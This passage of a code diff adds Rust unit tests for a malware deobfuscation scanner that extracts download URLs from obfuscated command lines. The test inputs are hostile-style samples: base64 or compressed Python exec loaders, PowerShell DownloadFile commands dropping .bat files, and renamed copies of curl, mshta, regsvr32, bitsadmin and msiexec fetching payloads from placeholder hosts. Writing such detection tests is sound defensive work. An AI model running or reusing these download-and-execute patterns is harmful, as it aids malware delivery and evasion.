+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "d = __import__('base64').b64decode; exec(d('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/dunder-assigned-alias-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python __import__ assigned b64 alias source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_dunder_import_base64_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/dunder-import-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(__import__('base64').b64decode('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/dunder-import-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from __import__ Python b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_import_base64_module_alias_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/module-alias-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "import base64 as b; exec(b.b64decode('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/module-alias-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python base64 module alias source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_assembled_url_is_scanned_after_resolution() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"powershell -Command "(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', 'C:\Users\Public\up.bat')""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && line_hint == "resolved-deob-var-fragments"
+                )
+            }),
+            "assembled URL not scanned after var-fragment resolution: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_assembled_url_uses_unicode_set_bindings() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"@set "方案=https"
+@set "主机=github.com"
+@set "路径=owner/repo/raw/main/up.png"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%主机:~0,10%/%路径:~0,26%', 'C:\Users\Public\up.bat')""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && line_hint == "resolved-deob-var-fragments"
+                )
+            }),
+            "assembled URL not scanned from Unicode set bindings: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_assembled_url_inside_nested_powershell_quotes() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"@set "方案=https"
+@set "主机=github.com"
+@set "路径=owner/repo/raw/main/up.png"
+start /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%主机:~0,10%/%路径:~0,26%', '%APPDATA%\up.bat');""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && line_hint == "resolved-deob-var-fragments"
+                )
+            }),
+            "assembled URL not scanned inside nested PowerShell quotes: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urlsafe_b64decode_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/url-safe-inner')";
+        let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(base64.urlsafe_b64decode('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/url-safe-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python urlsafe b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_b64decode_altchars_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded =
+            "import urllib.request;urllib.request.urlopen('https://py.example/altchars-inner')";
+        let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(base64.b64decode('{b64}', altchars=b'-_'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/altchars-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python altchars b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_zlib_decompress_b64decode_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded = "import requests;requests.get('https://py.example/zlib-inner')";
+        let mut encoder =
+            flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder
+            .write_all(decoded.as_bytes())
+            .expect("write zlib payload");
+        let compressed = encoder.finish().expect("finish zlib payload");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(compressed);
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(zlib.decompress(base64.b64decode('{b64}')))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/zlib-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python zlib b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_gzip_decompress_b64decode_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded =
+            "import urllib.request;urllib.request.urlopen('https://py.example/gzip-inner')";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder
+            .write_all(decoded.as_bytes())
+            .expect("write gzip payload");
+        let compressed = encoder.finish().expect("finish gzip payload");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(compressed);
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(gzip.decompress(base64.b64decode('{b64}')))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/gzip-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python gzip b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_keyword_url_calls_in_deob_text_emit_structured_downloads() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -9568,6 +25492,66 @@ $urlzip = "https://ps.example/stage.zip""#,
                 env.traits
             );
         }
+    }
+
+    #[test]
+    fn python_requests_keyword_url_ignores_header_url_literals() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; requests.get(headers={'Referer': 'https://py.example/referer'}, url='https://py.example/actual')""#,
+            &mut env,
+        );
+        let has_actual = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/actual" && dst.is_none()
+            )
+        });
+        assert!(
+            has_actual,
+            "no structured Download from Python requests keyword URL: {:?}",
+            env.traits
+        );
+        let promoted_referer = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/referer"
+            )
+        });
+        assert!(
+            !promoted_referer,
+            "Python requests header URL was promoted as structured source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_request_keyword_url_ignores_header_url_literals() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; requests.request(method='GET', headers={'Referer': 'https://py.example/request-referer'}, url='https://py.example/request-actual')""#,
+            &mut env,
+        );
+        let has_actual = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/request-actual" && dst.is_none()
+            )
+        });
+        assert!(
+            has_actual,
+            "no structured Download from Python requests.request keyword URL: {:?}",
+            env.traits
+        );
+        let promoted_referer = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/request-referer"
+            )
+        });
+        assert!(
+            !promoted_referer,
+            "Python requests.request header URL was promoted as structured source: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -9668,6 +25652,16 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
             "vjik -H \"User-Agent: curl\" -o Autoit3.exe http://curl-copy.example:2351\r\nvjik -o rugaiq.au3 http://curl-copy.example:2351/msi\r\n",
             &mut env,
         );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. } if target == "vjik"
+                )
+            }),
+            "copied curl alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
         for (url, dst) in [
             ("http://curl-copy.example:2351", "Autoit3.exe"),
             ("http://curl-copy.example:2351/msi", "rugaiq.au3"),
@@ -9725,6 +25719,309 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_curl_alias_proxy_url_is_not_download_source() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
+            src: "c:\\windows\\system32\\curl.exe".to_string(),
+            dst: "vjik.exe".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"vjik --PROXY http://curl-copy-proxy.example:8080 --OUTPUT NUL"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://curl-copy-proxy.example:8080"
+                )
+            }),
+            "copied curl proxy URL was promoted as structured download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_curl_alias_url_before_output_preserves_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
+            src: "c:\\windows\\system32\\curl.exe".to_string(),
+            dst: "vjik.exe".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"vjik --URL https://curl-copy-any-order.example/stage.bin --OUTPUT C:\Temp\stage.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-copy-any-order.example/stage.bin"
+                        && dst.as_deref() == Some(r#"C:\Temp\stage.bin"#)
+            )
+        });
+        assert!(
+            has,
+            "copied curl alias did not preserve any-order destination: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_curl_alias_attached_uppercase_output_preserves_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
+            src: "c:\\windows\\system32\\curl.exe".to_string(),
+            dst: "vjik.exe".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"vjik --URL=https://curl-copy-attached-output.example/stage.bin --OUTPUT=C:\Temp\stage.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-copy-attached-output.example/stage.bin"
+                        && dst.as_deref() == Some(r#"C:\Temp\stage.bin"#)
+            )
+        });
+        assert!(
+            has,
+            "copied curl alias did not preserve attached uppercase output: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_curl_alias_schemeless_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
+            src: "c:\\windows\\system32\\curl.exe".to_string(),
+            dst: "vjik.exe".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"vjik -o Autoit3.exe curl-copy-schemeless.example/stage.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://curl-copy-schemeless.example/stage.bin"
+                        && dst.as_deref() == Some("Autoit3.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from copied curl alias schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_mshta_alias_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\mshta.exe stage.pif".to_string(),
+            src: "c:\\windows\\system32\\mshta.exe".to_string(),
+            dst: "stage.pif".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"stage.pif https://copied-mshta.example/payload.hta"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. } if target == "stage.pif"
+                )
+            }),
+            "copied mshta alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Mshta { cmd } if cmd == "mshta.exe https://copied-mshta.example/payload.hta"
+                )
+            }),
+            "copied mshta alias did not replay through mshta handler: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: None, .. }
+                        if src == "https://copied-mshta.example/payload.hta"
+                )
+            }),
+            "no structured Download from copied mshta alias: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-mshta.example/payload.hta"
+                )
+            }),
+            "copied mshta URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_regsvr32_alias_in_deob_text_emits_scriptlet_url_argument() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\regsvr32.exe scrub.pif".to_string(),
+            src: "c:\\windows\\system32\\regsvr32.exe".to_string(),
+            dst: "scrub.pif".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"scrub.pif /s /n /u /i:https://copied-regsvr32.example/stage.sct scrobj.dll"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. } if target == "scrub.pif"
+                )
+            }),
+            "copied regsvr32 alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "regsvr32.exe /s /n /u /i:https://copied-regsvr32.example/stage.sct scrobj.dll"
+                            && url == "https://copied-regsvr32.example/stage.sct"
+                )
+            }),
+            "copied regsvr32 alias did not replay scriptlet URL: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-regsvr32.example/stage.sct"
+                )
+            }),
+            "copied regsvr32 URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_bitsadmin_alias_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\bitsadmin.exe C:\Users\Public\advapi32.dll"#
+                .to_string(),
+            src: r#"C:\Windows\System32\bitsadmin.exe"#.to_string(),
+            dst: r#"C:\Users\Public\advapi32.dll"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\advapi32.dll /transfer j1 /download /priority foreground https://copied-bits.example/a.exe C:\Users\Public\a.exe"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\advapi32.dll"#
+                )
+            }),
+            "copied bitsadmin alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::BitsadminDownload { url, dst }
+                        if url == "https://copied-bits.example/a.exe"
+                            && dst == r#"C:\Users\Public\a.exe"#
+                )
+            }),
+            "copied bitsadmin alias did not replay structured download: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-bits.example/a.exe"
+                )
+            }),
+            "copied bitsadmin URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_msiexec_alias_in_deob_text_emits_package_url_argument() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\msiexec.exe C:\Users\Public\install.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\msiexec.exe"#.to_string(),
+            dst: r#"C:\Users\Public\install.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\install.tmp /quiet /i https://copied-msiexec.example/setup.msi /qn"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\install.tmp"#
+                )
+            }),
+            "copied msiexec alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "msiexec.exe /quiet /i https://copied-msiexec.example/setup.msi /qn"
+                            && url == "https://copied-msiexec.example/setup.msi"
+                )
+            }),
+            "copied msiexec alias did not replay package URL: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-msiexec.example/setup.msi"
+                )
+            }),
+            "copied msiexec URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_style_compact_flags_exe_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -9774,6 +26071,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert!(
             has,
             "no structured Download from liberal curl-style compact flags: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_style_compact_flags_schemeless_url_emits_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#""C:\Tools\rdl.exe" -LJOk cdn-schemeless.example/files/steam.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://cdn-schemeless.example/files/steam.exe"
+                        && dst.as_deref() == Some("steam.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from schemeless curl-style compact flags: {:?}",
             env.traits
         );
     }
@@ -9853,6 +26171,89 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn curl_html_quote_entity_tail_is_trimmed_from_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl https://github.com/abarekl1/dcm/raw/main/Document.zip&#039 -o out.zip"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/abarekl1/dcm/raw/main/Document.zip"
+                )
+            }),
+            "HTML entity-tailed curl URL was not recovered cleanly: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("&#039")
+                )
+            }),
+            "HTML entity tail leaked into URL traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn generic_html_quote_entity_tail_is_trimmed_from_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"echo artifact: https://github.com/abarekl1/i/blob/main/f.png&quot"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://github.com/abarekl1/i/blob/main/f.png"
+                )
+            }),
+            "HTML entity-tailed generic URL was not recovered cleanly: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("&quot")
+                )
+            }),
+            "HTML entity tail leaked into generic URL traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_schemeless_domain_path_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl curl-schemeless-deob.example/payload.bin -o C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://curl-schemeless-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "no structured schemeless curl Download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_output_equals_in_deob_text_emits_clean_destination() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -9874,6 +26275,171 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn curl_url_flag_separated_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --url https://curl-separated-url-deob.example/payload.bin -o C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-separated-url-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl --url VALUE source not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_attached_long_options_case_insensitive_in_deob_text() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --URL=https://curl-upper-url-deob.example/payload.bin --OUTPUT=C:\Temp\upper.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-upper-url-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\upper.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl attached uppercase long options not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_remote_name_output_dir_in_deob_text_uses_joined_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --output-dir C:\Temp -O https://curl-output-dir-deob.example/payload.hta"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-output-dir-deob.example/payload.hta"
+                        && dst.as_deref() == Some(r#"C:\Temp\payload.hta"#)
+            )
+        });
+        assert!(
+            has,
+            "curl --output-dir -O destination not recovered in deob text: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_non_ascii_tokens_do_not_panic_prefix_checks() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "curl X:~49,1%¥Yr -\"%Ջლ能% https://curl-nonascii-token.example/payload.bin",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://curl-nonascii-token.example/payload.bin"
+            )
+        });
+        assert!(
+            has,
+            "curl URL not recovered after non-ASCII tokens: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_spaced_long_options_case_insensitive_in_deob_text() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --URL https://curl-upper-spaced-url-deob.example/payload.bin --OUTPUT C:\Temp\upper-spaced.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-upper-spaced-url-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\upper-spaced.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl spaced uppercase long options not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_uppercase_long_proxy_in_deob_text_is_not_download_source() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --PROXY http://proxy-only-deob.example:8080 --OUTPUT NUL"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://proxy-only-deob.example:8080"
+                )
+            }),
+            "curl proxy URL was promoted as structured download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_attached_long_proxy_in_deob_text_is_not_download_source() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --PROXY=http://proxy-attached-deob.example:8080 --OUTPUT NUL"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://proxy-attached-deob.example:8080"
+                )
+            }),
+            "attached curl proxy URL was promoted as structured download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_attached_url_schemeless_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --url=curl-attached-schemeless-deob.example/payload.bin --output C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://curl-attached-schemeless-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl attached schemeless --url source not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_short_o_glued_in_deob_text_emits_clean_destination() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -9890,6 +26456,48 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert!(
             has,
             "curl -oDEST destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_short_option_cluster_in_deob_text_emits_clean_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl -fsSLo C:\Temp\payload.bin https://curl-cluster-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-cluster-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl short-option cluster destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_remote_name_short_option_cluster_in_deob_text_uses_basename() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl -LO https://curl-cluster-remote-name-deob.example/payload.hta"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-cluster-remote-name-deob.example/payload.hta"
+                        && dst.as_deref() == Some("payload.hta")
+            )
+        });
+        assert!(
+            has,
